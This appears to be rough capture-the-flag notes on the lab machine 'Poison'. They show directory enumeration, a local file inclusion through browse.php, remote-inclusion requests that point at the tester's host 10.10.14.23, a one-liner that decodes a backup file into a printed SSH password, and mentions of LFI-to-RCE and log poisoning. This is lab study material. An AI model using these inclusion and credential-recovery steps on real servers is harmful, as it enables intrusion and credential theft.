                                                                           
                                                                                                                     
Extensions: php | HTTP method: GET | Threads: 50 | Wordlist size: 8920

Output File: /home/kali/sectools/dirsearch/reports/10.10.10.84/_21-07-03_21-45-41.txt

Error Log: /home/kali/sectools/dirsearch/logs/errors-21-07-03_21-45-41.log

Target: http://10.10.10.84/
                                                                                                                     
[21:45:42] Starting: 
[21:46:13] 200 -  289B  - /index.php/login/                                                                
[21:46:13] 200 -  289B  - /index.php                    
[21:46:13] 200 -  157B  - /info.php                   
[21:46:18] 200 -   67KB - /phpinfo.php    

http://10.10.10.84/info.php
FreeBSD Poison 11.1-RELEASE FreeBSD 11.1-RELEASE #0 r321309: Fri Jul 21 02:08:28 UTC 2017 root@releng2.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC amd64


http://10.10.10.84/browse.php?file=listfiles.php

    [0] =&gt; .
    [1] =&gt; ..
    [2] =&gt; browse.php
    [3] =&gt; index.php
    [4] =&gt; info.php
    [5] =&gt; ini.php
    [6] =&gt; listfiles.php
    [7] =&gt; phpinfo.php
    [8] =&gt; pwdbackup.txt



GET /browse.php?file=ftp://10.10.14.23/Anyfile HTTP/1.1    or http://10.10.14.23/Anyfile HTTP/1.1
Host: 10.10.10.84
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.10.10.84/
Upgrade-Insecure-Requests: 1


http://10.10.10.84/browse.php?file=http://10.10.14.23:8000/initial.nmap
Warning: include(): http:// wrapper is disabled in the server configuration by allow_url_include=0 in /usr/local/www/apache24/data/browse.php on line 2

Warning: include(http://10.10.14.23:8000/initial.nmap): failed to open stream: no suitable wrapper could be found in /usr/local/www/apache24/data/browse.php on line 2

Warning: include(): Failed opening 'http://10.10.14.23:8000/initial.nmap' for inclusion (include_path='.:/usr/local/www/apache24/data') in /usr/local/www/apache24/data/browse.php on line 2

#### Initial Foothold
### 1. decode the pwdbackup.txt and ssh in with the decoded password

http://10.10.10.84/browse.php?file=pwdbackup.txt
This password is secure, it's encoded atleast 13 times..


data=$(cat pwd.b64); for i in $(seq 1 13); do data=$(echo $data | tr -d ' ' | base64 -d); done; echo $data
Charix!2#4%6&8(0

### 2. phpinfo.php race condition that turns LFI to an RCE

use the lfi.py script
edit the script to make it work, refer to ippsec video for more 


### 3. log poisoning

http://10.10.10.84/browse.php?file=dof

Warning: include(dof): failed to open stream: No such file or directory in /usr/local/www/apache24/data/browse.php on line 2

Warning: include(): Failed opening 'dof' for inclusion (include_path='.:/usr/local/www/apache24/data') in /usr/local/www/apache24/data/browse.php on line 2




